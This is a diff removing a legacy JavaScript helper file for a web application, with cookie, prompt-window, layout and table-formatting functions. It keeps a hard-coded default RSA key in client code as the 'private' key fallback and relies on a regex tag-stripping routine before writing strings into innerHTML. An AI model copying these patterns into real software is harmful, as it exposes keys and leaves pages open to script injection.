@@ -1,4593 +1,1 @@
-/**************************************************************************
- * (C) Copyright 2006-2013 by Systems on Web, Inc.  All Rights Reserved.  *
- * Author: Zhongyan Lin                                                   *
- **************************************************************************/
-if (typeof(someconsts)=='undefined')
-{
-var someconsts=['<meta http-equiv="Pragma" content="no-cache" ><meta http-equiv="content-type" content="text/html; charset=gb2312" />','arial,KaiTi,KaiTiGB2312,STKaiti','121334211234341231231324354546765765sdffhgfjhgasczerrtredsv1312344dfdw3rhdsgQWERETEASA','1','3598000','zh-cn'];
-var unititle = function(str,cls){
-        if (cls!='outset2') 
-        return '<table cellspacing=0 cellpadding=0 width=100% border=0 align=center class=' + cls + ' ><tr height=48><td valign=middle align=center><table width=100%  align=center><tr><td width=36 align=middle id=homeico  onclick=gohome()></td><td  align=center><div class=forcurve1 style=width:180px;overflow:hidden  id=titlediv  onclick=qrlink()><NOBR>' + str + '</NOBR></div></td><td  onclick=actionmenu(this) valign=middle width=20  align=center  style="font-size:20px;color:white;padding:0px">&vellip;</td></tr></table></td></tr></table>'; 
-        return '<table  cellspacing=0 cellpadding=0 width=100%   align=center ><tr><td width="2px"></td><td class=outset2 valign=middle align=center style="border:1px outset"><table width=100% ><tr><td width=36 valign=middle  id=homeico   onclick=gohome()></td><td  align=center><div class=forcurve1  onclick=qrlink()  id=titlediv><NOBR>' + str + '</NOBR></div></td></tr></table></td><td width="3px"></td></tr></table>';
-    } 
-}
- if (typeof(parent.frames)!='undefined' && parent.frames.length>0 && parent.frames[0]==window)
- {
-     var oldunititle = unititle;
-     unititle = function(x,y){ return oldunititle(x,y).replace(/&vellip;/,'');}
- }
- var metaencode=someconsts[0];
- var defaultfontfamily=someconsts[1];
- var apphashgene = someconsts[2];
- var latexislocal= (someconsts[3]== '1');
- var activeidletime= parseInt(someconsts[4]);
- var ibgcolorw =  "#785673";
- function headercl( clx) {
-        var  cl = "#45626a";
-        if (clx==("red")) {
-            clx = "#ff0000";
-         } else if (clx==("blue")) {
-            clx = "#0000ff";
-        } else if (clx==("green")) {
-            clx = "#00ff00";
-        } else if (clx == null || clx==("") || clx.charAt(0) != '#' || clx.length  < 7) {
-            clx = "#45626a";
-        }
-        var hs = "0123456789ABCDEF";
-        var  j =  parseInt(clx.substring(1, 3), 16);
-        if (j >= 128) {
-            j-=30;
-        } else if (j < 128) {
-            j+=30;
-        }
-        var  k =  parseInt(clx.substring(3, 5), 16);
-        if (k >= 128) {
-            k-=30;
-        } else if (k < 128) {
-            k+=30;
-        }
-        var  l =  parseInt(clx.substring(5), 16);
-        if (l >= 128) {
-            l-=30;
-        } else if (l < 128) {
-            l+=30;
-        }
-        cl = "#" + hs.charAt(j / 16) + hs.charAt(j % 16);
-        var  k1 = k / 16;
-        var  k2 = k % 16;
-        var  l1 = l / 16;
-        var  l2 = l % 16;
-        cl = cl + hs.charAt(k1);
-        cl = cl + hs.charAt(k2);
-        cl = cl + hs.charAt(l1);
-        cl = cl + hs.charAt(l2);
-        return cl;
-    } 
- 
- if (typeof(IBGCOLOR)=='undefined')
-     IBGCOLOR = '#01170B';
- ibgcolorw = headercl(IBGCOLOR);
-  
- var gradientbg = "linear-gradient(" + IBGCOLOR + "," + ibgcolorw + ")";
-  
- var expiretime=activeidletime+(new Date()).getTime(); 
- var crosssite = null;
-var promptwin = null;
-var mychildwin = new Array();
-var myparentwin = null;
-var defaultrsakey = "10001,202700adbd85e2d7182720c3a0ee19c1,30db31542ace0f7d37a629ee5eba28cb,7";
-var needtochecksyntax = true;
-var failedformsubmit='';
-var openedfileinframe1 = false;
-var font_size1 = '';
-var oldonclose0 = null;
-var oldonbegin00 = null;
-var indexwindow = null;
-var savedredourl = '';
-var activealink = null;
-var numcalls = 0;
-var systemnamestr = null;
-var ccbeing = -1;
-var promptfunc = null;
-var iaminpuprompt = false;
-var keepgoing = true;
-var editingfmt = 0;
-var tabeingedited = null;
-var AMtranslated = true;
-var totaleles = 0;
-var myfontname = 'inherit';
-var round20 = "</td><td width=5  ><div style=\"height:1px;width:5px;background-color:transparent;cursor:e-resize\"></div></td>"
-        + "</tr><tr height=5><td width=5  ></td>"
-        + "<td colspan=1  ><div style=\"width:100%;height:5px;cursor:s-resize\"></div></td>"
-        + "<td width=5 ><div style=\"width:5px;height:5px;cursor:se-resize\"></div></td></tr></table>";
-
-var round2 = "</td><td width=2  ><div style=\"width:100%;cursor:e-resize\"></div></td>"
-        + "</tr><tr height=5><td width=2   ></td>"
-        + "<td   ><div style=\"width:100%;height:2px;cursor:s-resize\"></div></td>"
-        + "<td width=2  ><div style=\"width:2px;height:2px;cursor:se-resize\"></div></td></tr></table>";
-function ismobile()
-{
-    return navigator.userAgent.match(/Android/i) ||
-            navigator.userAgent.match(/BlackBerry/i) ||
-            navigator.userAgent.match(/iPhone|iPad|iPod/i)
-            || navigator.userAgent.match(/Opera Mini/i)
-            || navigator.userAgent.match(/IEMobile/i);
-}
-
-
-function writenow(x)
-{
-    document.write(x);
-}
-
-function getcrosssite()
-{
-    if (crosssite != null)
-        return crosssite;
-    var crosssite1 = null;
-    if (opener != null&& onmydomain(opener) && opener != self && typeof (opener.getcrosssite) != 'undefined')
-        crosssite1 = opener.getcrosssite();
-    if (crosssite1 != null)
-    {
-        crosssite = crosssite1;
-        return crosssite1;
-    }
-    
-    if ( parent != window && typeof (parent.getcrosssite) != 'undefined')
-    {
-        crosssite1 = parent.getcrosssite();
-        if (crosssite1 != null)
-        {
-            crosssite = crosssite1;
-            return crosssite1;
-        }
-    }
-    return null;
-}
-
-function clickedhere(obj)
-{
-
-    if (typeof (findPositionnoScrolling) != 'undefined')
-    {
-        var xy = findPositionnoScrolling(obj);
-        closeprompt();
-        promptwin = document.createElement('div');
-        promptwin.setAttribute('id', "myprompt");
-        promptwin.style.cssText = "position:absolute;border:1px #b0b0b0 outset;font-size:25px;font-weight:700;background:url(image/giphy.gif);z-index:30;top:" + xy[1] + "px;left:" + xy[0] + "px;width:" + obj.offsetWidth + "px;height:" + obj.offsetHeight + "px;overflow:hidden;font-family:inherit";
-       /* var x = '';
-        var N = Math.ceil(obj.offsetWidth / 8);
-        var v = 0;
-        while (N > 0)
-        {
-            var j = Math.round(Math.random() * 6);
-            v = 1 - v;
-            x += "<font color=" + (v == 0 ? 'white' : 'black') + ">";
-            for (var k = 0; k < j && N > 0; k++)
-            {
-                x += "&middot;";
-                N--;
-            }
-            x += "</font>";
-        }*/
-        var x  = '';
-        promptwin.innerHTML = x;
-        document.body.appendChild(promptwin);
-
-    }
-}
-
-function childwinborn(win)
-{
-    var x = document.location.toString();
-    var j = x.lastIndexOf("/");
-    if (x.substring(j + 1).indexOf("index") == 0)
-    {
-        window.onbeforeunload = "Child windows not close. Continue?";
-    }
-    for (var i = 0; i < mychildwin.length; i++)
-        if (mychildwin[i] == win)
-        {
-            return;
-        }
-    for (var i = 0; i < mychildwin.length; i++)
-        if (mychildwin[i] == null)
-        {
-            mychildwin[i] = win;
-            return;
-        }
-    mychildwin[mychildwin.length] = win;
-}
-function childwindie(win)
-{
-    mychildwin.remove(win);
-    var j = x.lastIndexOf("/");
-    if (x.substring(j + 1).indexOf("index") == 0 && mychildwin.length == 0)
-    {
-        window.onbeforeunload = null;
-    }
-}
-
-function childwindie1(win)
-{
-    try{
-    if (opener != null&& onmydomain(opener) && opener.childwinborn)
-    {
-        myparentwin.childwindie(window);
-    }
-    else if (parent.opener != null && parent.opener.childwinborn)
-    {
-        myparentwin.childwindie(window.parent);
-    }
-    else if (parent.parent.opener != null&& onmydomain(parent.parent.opener) && parent.parent.opener.childwinborn)
-    {
-        myparentwin.childwindie(window.parent.parent);
-    }
-    }
-    catch(e){}
-
-}
-
-function lookforparent()
-{
-    try{
-    if (opener != null && opener.childwinborn)
-    {
-        myparentwin = opener;
-        myparentwin.childwinborn(window);
-    }
-    else if (parent.opener != null&& onmydomain(parent.opener) && parent.opener.childwinborn)
-    {
-        myparentwin = parent.opener;
-        myparentwin.childwinborn(window.parent);
-    }
-    else if (parent.parent.opener != null&& onmydomain(parent.parent.opener) && parent.parent.opener.childwinborn)
-    {
-        myparentwin = parent.parent.opener;
-        myparentwin.childwinborn(window.parent.aprent);
-    }
-    }catch(e){}
-}
-
-if (typeof (onclose) != 'undefined')
-{
-    onclose += ";closechildwin();myparentwin.childwindie1(self);";
-}
-else
-{
-    var onclose = ";closechildwin();myparentwin.childwindie1(self);";
-}
-
-if (typeof (onbegin) != 'undefined')
-{
-     onbegin += ";lookforparent();";
-}
-else
-{
-     var onbegin = ";lookforparent();";
-}
-function closechildwin()
-{
-    for (var j = 0; j < myparentwin.length; j++)
-        myparentwin[j].close();
-}
-
-
-function getCookieVal(offset)
-{
-    var endstr = document.cookie.indexOf(";", offset);
-    if (endstr == -1)
-        endstr = document.cookie.length;
-    return decodeURIComponent(document.cookie.substring(offset, endstr));
-}
-
-function GetCookie(name)
-{
-    var arg = name + "=";
-    var alen = arg.length;
-    var clen = document.cookie.length;
-    var i = 0;
-    while (i < clen)
-    {
-        var j = i + alen;
-        if (document.cookie.substring(i, j) == arg)
-            return getCookieVal(j);
-        i = document.cookie.indexOf(" ", i) + 1;
-        if (i == 0)
-            break;
-    }
-    return null;
-}
-
-function dothetable(v)
-{
-    var j = v.indexOf("\n\t");
-    if (j>=0) return v;
-    j = v.indexOf("\r\t");
-    if (j>=0) return v;
-    j = v.indexOf("\t", 1);
-    if (j == -1) return v;
-    var x =(new CSVParse(v, '"', "\t", "\r\n")).nextMatrix(false);
-    var str = '';
-    var start = -1;
-    var z;
-    for (var r = 0;  r < x.length; r++)
-    {
-    
-       if ((x[r] == null ||x[r].length == 1) && (r==0 || x[r-1]!=null && x[r-1].length>1))
-       {
-            z = '';
-       }
-       
-       if (x[r] == null ||x[r].length == 1)
-       {
-           if (x[r] ==null )  
-           {
-               if ( r < x.length-1)z+=('\n');
-           }
-           else
-           {
-               if (x[r][0].indexOf('\t')>=0 || x[r][0].indexOf('\r')>=0 || x[r][0].indexOf('\n')>=0)
-                   z += ('"');
-               z += (x[r][0]);
-               if (x[r][0].indexOf('\t')>=0 || x[r][0].indexOf('\r')>=0 || x[r][0].indexOf('\n')>=0)
-                   z += ('"');
-               if (r < x.length-1)
-                   z += ('\n');
-           }
-           
-           if (r == x.length-1 || x[r+1]!=null && x[r+1].length>1)
-           {
-               str += z;
-               z= '';
-               start = r;
-           }
-           
-           
-           
-       }
-       else if (r == x.length-1 || x[r+1]==null  || x[r].length!=x[r+1].length  )
-       {
-           str += '<table align=center border=1 style="border:1px #aaaaaa solid;border-collapse:collapse;border-radius:3px;border-color:#cccccc">';
-           for ( var i= start+1; i <= r; i++)
-           {
-               str += "<tr>";
-               var startj = 0;
-               for (var j=0; j < x[i].length; j++)
-               {
-                   var k = -1;
-                   if (  (x[i][j] != null&&x[i][j]!='') && ( j == x[i].length-1 || x[i][j+1]!=null&&x[i][j+1]!=''))
-                   {
-                       k = j;
-                   }
-                   else if ( (x[i][j] == null||x[i][j]=='') && ( j == x[i].length-1 || x[i][j+1]!=null&&x[i][j+1]!=''))
-                   {
-                       k = startj;
-                   }
-                   else if ( j < x[i].length-1 &&  x[i][j] != null&& x[i][j]!='' && ( x[i][j+1]==null||x[i][j+1]=='')   )
-                   {
-                       startj = j;
-                   }
-                   if (k > -1)
-                   {
-                       str += '<td   valign=top    ';
-                       var col = j - k +1;
-                       if (col > 1) str += ' colspan=' + col + " ";
-                       if (x[i][k].charAt(0) == ' ' && x[i][k].charAt(x[i][k].length-1)==' ')
-                           str += 'align=center ';
-                       else if (x[i][k].charAt(0) == ' ' && x[i][k].charAt(x[i][k].length-1)!=' ')
-                           str += 'align=right ';
-                       else  if (x[i][k].charAt(0) != ' ' && x[i][k].charAt(x[i][k].length-1)==' ')
-                           str += 'align=left ';
-                       else if ( isNaN(x[i][k]))
-                           str += 'align=left ';
-                       else if ( !isNaN(x[i][k]))
-                           str += 'align=right ';
-                       else 
-                       str += '>' + x[i][k] + '</td>';
-                   }
-               }
-               str += "</tr>";
-           }
-           str += '</table>';
-           start = r;
-       }
-        
-    }
-     
-    return str;
-}
-var codestab = new RegExp("[\t|\n][ ]*\t");
-function formatstr(v, fmt)
-{
-    if (v == null) return v;
-    var  mc = codestab.exec(v);
-    var  e = 0;
-    if (mc!=null)
-    { 
-        e = mc.index + mc.toString().length;
-        mc = codestab.exec(v.substring(e));
-        if (mc!=null)
-        {
-           e += mc.index + mc.toString().length;
-           mc = codestab.exec(v.substring(e));
-           if (mc!=null)
-           {
-               return formatstr0(v, fmt);
-           }
-        }
-    } 
-     
-    if (v.indexOf('@#@,@@,#\t')>=0) 
-        return formatstr0(v, fmt);
-    j = v.indexOf("\t", 1);
-    
-    if (j == -1) return formatstr0(v, fmt);
-     
-    var psr =(new CSVParse(v, '"', "\t", "\r\n"));
-    psr.ignorespace = false;
-    var x = psr.nextMatrix(false);
-    var str = '';
-    var start = -1;
-    var z;
-    for (var r = 0;  r < x.length; r++)
-    {
-    
-       if ((x[r] == null ||x[r].length == 1) && (r==0 || x[r-1]!=null && x[r-1].length>1))
-       {
-            z = '';
-       }
-       
-       if (x[r] == null ||x[r].length == 1)
-       {
-           if (x[r] ==null )  
-           {
-               if ( r < x.length-1)z+=('\n');
-           }
-           else if(x[r][0]!=null)
-           {
-               if (x[r][0].indexOf('\t')>=0 || x[r][0].indexOf('\r')>=0 || x[r][0].indexOf('\n')>=0)
-                   z += ('"');
-               z += (x[r][0]);
-               if (x[r][0].indexOf('\t')>=0 || x[r][0].indexOf('\r')>=0 || x[r][0].indexOf('\n')>=0)
-                   z += ('"');
-               if (r < x.length-1)
-                   z += ('\n');
-           }
-           
-           if (r == x.length-1 || x[r+1]!=null && x[r+1].length>1)
-           {
-               str += formatstr0(z, fmt);
-               z= '';
-               start = r;
-           }
-           
-           
-           
-       }
-       else if (r == x.length-1 || x[r+1]==null  || x[r].length!=x[r+1].length  )
-       {
-           str += '<div style=display:block;align-content:' + (x[start+1][0].indexOf('  ')==0?'center':'left') + '><table  border=1 style="border:1px #aaaaaa solid;border-collapse:collapse;border-radius:3px;border-color:#cccccc;margin:3px 0px 3px 0px">';
-           for ( var i= start+1; i <= r; i++)
-           {
-               str += "<tr>";
-               var startj = 0;
-               for (var j=0; j < x[i].length; j++)
-               {
-                   var k = -1;
-                   if (  (x[i][j] != null&&x[i][j]!='') && ( j == x[i].length-1 || x[i][j+1]!=null&&x[i][j+1]!=''))
-                   {
-                       k = j;
-                   }
-                   else if ( (x[i][j] == null||x[i][j]=='') && ( j == x[i].length-1 || x[i][j+1]!=null&&x[i][j+1]!=''))
-                   {
-                       k = startj;
-                   }
-                   else if ( j < x[i].length-1 &&  x[i][j] != null&& x[i][j]!='' && ( x[i][j+1]==null||x[i][j+1]=='')   )
-                   {
-                       startj = j;
-                   }
-                   if (k > -1)
-                   {
-                       str += '<td   valign=top    ';
-                       var col = j - k +1;
-                       if (col > 1) str += ' colspan=' + col + " ";
-                       if (x[i][k].charAt(0) == ' ' && x[i][k].charAt(x[i][k].length-1)!=' ')
-                           str += 'align=right ';
-                       else  if (x[i][k].charAt(0) != ' ' && x[i][startj].charAt(x[i][k].length-1)==' ')
-                           str += 'align=leftt ';
-                       else if (x[i][k].charAt(0) == ' ' && x[i][startj].charAt(x[i][k].length-1)==' ')
-                           str += 'align=center ';
-                       str += '>' + formatstr0(x[i][k], fmt) + '</td>';
-                   }
-               }
-               str += "</tr>";
-           }
-           str += '</table></div>';
-           start = r;
-       }
-        
-    }
-     
-    return str;
-}
-function delCookie(name)
-{
-    document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-}
-function SetCookie(name, value, expdays)
-{
-    
-    var expires = null;
-    
-    var argv = SetCookie.arguments;
-    var argc = SetCookie.arguments.length;
-    if (expdays !=null)
-    {
-        //expdays = 365;
-        var exp = new Date();
-        exp.setTime(exp.getTime() + Math.floor(expdays * (3600000 * 24)));
-        expires = exp;
-    }
-    delCookie(name);
-    var path = (3 < argc) ? argv[3] : null;
-    var domain = (4 < argc) ? argv[4] : null;
-    var secure = (5 < argc) ? argv[5] : false;
-    document.cookie = name + "=" + encodeURIComponent(value) +
-            ((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
-            ((path == null) ? "" : ("; path=" + path)) +
-            ((domain == null) ? "" : ("; domain=" + domain)) +
-            ((secure == true) ? "; secure" : "");
-}
-
-function getRSAkeys()
-{
-    var privatersa = getcrosssite();
-    if (privatersa == null)
-    {
-        if (opener != null&& onmydomain( opener) && opener.getcrosssite != null)
-            privatersa = opener.getcrosssite();
-    }
-    if (privatersa == null)
-        privatersa = defaultrsakey;
-    return privatersa.split(",");
-}
-
-function getrsakeyN4()
-{
-    var xx = getRSAkeys();
-    return xx[2].substring(0, 4);
-}
-function saveMyrsakey(appletvar)
-{
-    if (typeof (crosssite) != 'undefined')
-        crosssite = appletvar;
-}
-
-function setfontsz(str)
-{
-    font_size1 = str;
-}
-function unifontstyle(font_size)
-{
-    var fontname = defaultfontfamily;
-    var weight = 500;
-    if (font_size > 15)
-        weight = Math.floor(weight * Math.sqrt(font_size / 15));
-    return   "<style type=text/css>input{font-size:" + font_size + "px;padding:0px 1px;margin:0px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "select{font-size:" + font_size + "px;padding:0px;margin:0px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "textarea{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "body{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "div{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + ".thehint{background:yellow;border:1px outset green;color:purple;font-size:" + (font_size + 1) + "px;font-family:" + fontname + "}\n"
-            + "table,tr,td,TABLE,TR,TD{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "table,tr,td,TABLE,TR,TD,table,tr,td,TABLE,TR,TD{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}\n"
-            + "table,tr,td,TABLE,TR,TD,table,tr,td{font-size:" + font_size + "px;font-weight:" + weight + ";font-family:" + fontname + "}</style>"
-            ;
-}
-function bufferit(s)
-{
-    var x= GetCookie('fileurlbuf');
-    if (x==null) x = '';
-    else if (x.indexOf(s)>=0) return;
-    SetCookie('fileurlbuf', x+s, 0.02);
-}
-function butstyle(font_size)
-{
-    return " class=GreenButton style=width:" + Math.ceil(font_size * charwidthrate()) + "px";
-}
-function dim(w, h)
-{
-    return "toolbar=0,location=0,directories=0,status=0,menubar=0,alwaysRaised=1,scrollbars=1,resizable=1,width=" + w + ",height=" + h + ",top=" + ((screen.height - h) / 2) + ",left=" + ((screen.width - w) / 2);
-}
-
-function tail()
-{
-    if (parent == window)
-    {
-        var imp = document.images['testimg'];
-        if (imp == null)
-            return;
-        var twidth = imp.width + 60;
-        if (twidth < 250)
-            twidth = 250;
-        var lll = (screen.width - twidth) / 2;
-        if (theight < 150)
-            theight = 150;
-        if (theight > screen.height - 35)
-            theight = screen.height - 35;
-        var ttt = (screen.height - theight) / 2;
-        if (lll < 0)
-            lll = 0;
-        if (typeof resizeCont == 'function')
-            resizeCont();
-        if (typeof IBGCOLOR == 'undefined')
-            var IBGCOLOR = "green";
-        if (twidth > 400 && theight > 350)
-            document.write("<center> <font size=-1 color=" + IBGCOLOR + ">" + textmsg[790] + "</font> </center>");
-    }
-}
-
-function formselementbyname(formhandle, elenametxt)
-{
-    if (elenametxt==null || formhandle == null || formhandle.tagName==null|| formhandle.tagName.toLowerCase() != 'form')
-    {
-        //alert(formselementbyname.caller)
-        return null;
-    }
-    for (var i = 0; i < formhandle.elements.length; i++)
-        if (formhandle.elements[i].name!=null && formhandle.elements[i].name.toLowerCase() == elenametxt.toLowerCase())
-            return formhandle.elements[i];
-    return null;
-}
-function openblank(windowNameStr, optionStr, tl)
-{
-    var winhandle = window.open('', windowNameStr, optionStr);
-    if (winhandle == null)
-        return null;
-    var doc = winhandle.document;
-    if (doc != null && doc.body.innerHTML != '')
-    {
-        doc.body.innerHTML = '';
-    }
-    else
-    {
-        if (typeof encoding == 'undefined')
-            var encoding = document.charset;
-        var bgcolor = "lightyellow";
-        if (typeof DBGCOLOR != 'undefined')
-            bgcolor = DBGCOLOR;
-        if (tl == null)
-            tl = textmsg[107];
-        winhandle.document.write("<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset="
-                + encoding + "\"><title>" + tl + "</title></head><body style=\"background-color:" + bgcolor + "\">");
-    }
-    return winhandle;
-}
-function endDocWrite(winhandle)
-{
-    winhandle.document.write("</body>");
-    //winhandle.document.write("<scrip" + "t>if (navigator.appName=='Netscape')setTimeout('window.stop()',200);</s" +"cript>");
-    winhandle.document.write("</html>");
-    winhandle.focus();
-}
-var showmyhint = function(j) {
-}
-var hidemyhint = function() {
-}
-
-
-
-var thispagewidth = function()
-{
-    var wd = screen.width - 200;
-    if (typeof (self.innerWidth) != 'undefined')
-    {
-        wd = self.innerWidth;
-    }
-    else if (typeof document.documentElement != 'undefined'
-            && typeof document.documentElement.clientWidth !=
-            'undefined' && document.documentElement.clientWidth != 0)
-    {
-        wd = document.documentElement.clientWidth;
-    }
-    else
-    {
-        wd = document.getElementsByTagName('body')[0].clientWidth;
-    }
-    return wd;
-}
-
-var thispageheight = function()
-{
-    if (navigator.appName.indexOf('Explorer') > 0)
-    {
-        return (document.documentElement && document.documentElement.clientHeight) || window.innerHeight || self.innerHeight || document.body.clientHeight;
-    }
-    var het = screen.height;
-    if (typeof (self.innerHeight) != 'undefined')
-    {
-        het = self.innerHeight;
-    }
-    else if (typeof document.documentElement != 'undefined'
-            && typeof document.documentElement.clientWidth !=
-            'undefined' && document.documentElement.clientWidth != 0)
-    {
-        het = document.documentElement.clientHeight;
-    }
-    else
-    {
-        het = document.getElementsByTagName('body')[0].clientHeight;
-    }
-    return het;
-}
-
-var thispagescrollheight = function()
-{
-    if (typeof (self.innerWidth) != 'undefined')
-    {
-        return document.height;
-    }
-    return  document.body.scrollHeight;
-}
-
-var thispagescrollwidth = function()
-{
-    if (typeof (self.innerWidth) != 'undefined')
-    {
-        return document.width;
-    }
-    return document.body.scrollWidth;
-}
-
-var thescrollleft = function()
-{
-    var h = 0;
-    if (typeof (document.body)!='undefined' && document.body!=null && typeof (document.body.scrollLeft) != 'undefined')
-    {
-        h = document.body.scrollLeft;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (document.documentElement)!='undefined' && document.documentElement!=null &&typeof (document.documentElement.scrollLeft) != 'undefined')
-    {
-        h = document.documentElement.scrollLeft;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (self.pageXOffseth) != 'undefined')
-    {
-        h = self.pageXOffset;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (document.body)!='undefined' && document.body!=null && typeof (document.body.parentElement) != 'undefined')
-    {
-        h = document.body.parentElement.scrollLeft;
-    }
-    return h;
-}
-
-var thescrolltop = function()
-{
-    var h = 0;
-    if (typeof (document.body)!='undefined' && document.body!=null && typeof (document.body.scrollTop) != 'undefined')
-    {
-        h = document.body.scrollTop;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (document.documentElement)!='undefined' && document.documentElement!=null && typeof (document.documentElement.scrollTop) != 'undefined')
-    {
-        h = document.documentElement.scrollTop;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (self.pageYOffseth) != 'undefined')
-    {
-        h = self.pageYOffset;
-    }
-    if (h > 0)
-        return h;
-    if (typeof (document.body)!='unefined' && document.body!=null  && typeof (document.body.parentElement) != 'undefined')
-    {
-        h = document.body.parentElement.scrollTop;
-    }
-    return h;
-}
-
-function removejs(str)
-{
-    if (str == null)
-        return null;
-    var rg, rg1;
-    for (var q = 0; q < 4; q++)
-    {
-        if (q == 0)
-        {
-            rg = new RegExp(/<scr.pt[^>]*>/i);
-            rg1 = new RegExp(/<\/script[ ]*>/i);
-        }
-        else if (q == 1)
-        {
-            rg = new RegExp(/<embed[^>]*>/i);
-            rg1 = new RegExp(/<\/embed[ ]*>/i);
-        }
-        else if (q==2)
-        {
-            rg = new RegExp(/<object[^>]*>/i);
-            rg1 = new RegExp(/<\/object[ ]*>/i);
-        }
-        else
-        {
-            rg = new RegExp(/<style[^>]*>/i);
-            rg1 = new RegExp(/<\/style[ ]*>/i);
-        }
-
-
-        var k = 0, k1 = 0;
-        var s = '';
-        var m = rg1.exec(str);
-        if (m != null)
-        {
-            k1 = m.index + m.toString().length;
-            m = rg.exec(str);
-            if (m != null && k1 <= m.index)
-                k = k1;
-        }
-        while (k < str.length)
-        {
-            m = rg.exec(str.substring(k));
-            if (m == null)
-                return s + str.substring(k);
-
-            s += str.substring(k, k + m.index);
-            var j = m.index + k + 8;
-            var n = rg1.exec(str.substring(j));
-            if (n == null)
-                return s;
-
-            k = n.index + n.toString().length + j;
-        }
-        if (q < 2)
-            str = s;
-    }
-    return s;
-}
-function mypromptchanggemsg(x)
-{
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].innerHTML = x;
-}
-function mypromptmodifymsg(x)
-{
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].innerHTML += x;
-}
-function mypromptmsg(x)
-{
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].innerHTML = x;
-}
-function getpromptmsg()
-{
-    if (promptwin == null) return "";
-    return promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0].innerHTML;
-}
-function addpromptmsg(y)
-{
-    if (promptwin == null)
-    {
-        myprompt(y);
-        return;
-    }
-    var x = promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0];
-    var dv = document.createElement("div");
-    dv.style.margin = "2px 3px 2px 3px";
-    dv.innerHTML = y;
-    x.appendChild(dv);
-
-}
-
-function mypromptonclose(func)
-{
-    promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('img')[0]
-    .onclick = func;
-}
-
-function myprompt(str, dfv, func, title,mypromptid)
-{
-    if(str==null||str=='') return;
-    if (document.body == null) return;
-    if (mypromptid==null)
-        mypromptid = "myprompt";
-    var promptwin0 = document.getElementById(mypromptid);
-    str = removejs(str);
-    if (promptwin0 != null)
-    {
-        keepgoing = false;
-        if (iaminpuprompt)
-            return;
-        var b = document.getElementById("dragcropbox");
-        if (b!=null) document.body.removeChild(b);
-        closeprompt(mypromptid);
-    }
-    iaminpuprompt = (func != null);
-    var iamgoing = (dfv != null && dfv == true && func == null);
-
-    promptfunc = func;
-    var wd = thispagewidth();
-    if (wd > screen.width)
-        wd = screen.width;
-    var het = thispageheight();
-    if (het > screen.height)
-        het = screen.height;
-    var thescrollt = thescrolltop();
-    var thescrolll = thescrollleft();
-    var promptwin0 = document.createElement('div');
-
-    promptwin0.setAttribute('id', mypromptid);
-
-    var bordercolor = "#0000BB";
-    if (typeof (IBGCOLOR) != 'undefined')
-        bordercolor = IBGCOLOR;
-    var pbgcolor = "#FFEECC";
-    if (typeof (DBGCOLOR) != 'undefined')
-        pbgcolor = DBGCOLOR;
-
-    var len = 300;
-    if (typeof (font_size) != 'undefined')
-        len = Math.ceil(75 + 300 * font_size / 20);
-    else if (typeof (fontsize) != 'undefined')
-        len = Math.ceil(75 + 300 * fontsize / 20);
-    if (len > wd - 20)
-        len = wd - 20;
-
-    if (iamgoing == false)
-    {
-        promptwin0.style.cssText = "position:absolute;color:black;border:0px;padding:0px;zIndex:20;top:0px;width:" + len + "px;left:" + Math.floor((wd - len) / 2) + "px;font-family:inherit" ;
-    }
-    else
-    {
-        promptwin0.style.cssText = "position:absolute;color:black;border:0px;padding:0px;zIndex:20;wodth:300px;overflow:hidden;top:" + (het - 200) + "px;left:" + (wd - 330) + "px;font-family:inherit";
-    }
-    var picwidth = 22;
-    var bdim = "width:68px;height:21px;";
-
-    if (typeof (font_size) != 'undefined')
-    {
-        picwidth = font_size + 6;
-        bdim = "width:" + Math.round(font_size * 4.5) + "px;";
-    }
-    var fw = 4;
-
-    if (title == null || title == '')
-    {
-        if (func != null)
-        {
-            if (dfv == null)
-                title = textmsg[1633];
-            else
-                title = textmsg[1634];
-        }
-        else
-            title = textmsg[1635];
-    }
-
-    var head = round10('100%').replace(/">$/, "background-color:" + pbgcolor + ";font-family:" + myfontname +  ";\">")
-            + "<table border=0 style=\"border-radius:" + fw + "px;-webkit-border-radius:" + fw + "px;-moz-border-radius:" + fw + "px;background-color:" + pbgcolor + ";border:0px " + bordercolor + " solid;font-family:" + myfontname + "\"   border=0 width=100% cellpadding=2 cellspacing=0>"
-            +"<tr style=\"font-family:" + myfontname + ";background:" + gradientbg + ";background-color:" + bordercolor + "\" >"
-            + "<td   style=\"width:" + picwidth + "px !important;font-family:" + myfontname + "\" valign=middle align=left>"
-            + "<img  style=\"margin:0px 0px 0px 0px;float:left;width:" + picwidth + "px !important;border-radius:" + Math.round(picwidth/2) + "px;cursor:pointer\" src=\"image/icon/smalls00.png\" onclick=\"closeprompt('" + mypromptid + "')\" onmouseover=\"swappic(this)\" onmouseout=\"swappic(this)\"></td>"
-            + "<td id=myprompthead  valign=middle align=center style=\"color:#DDCC05;font-weight:700;text-align:center;font-family:" + myfontname + "\" onclick=stopgoing()><nobr>"
-            + (title)
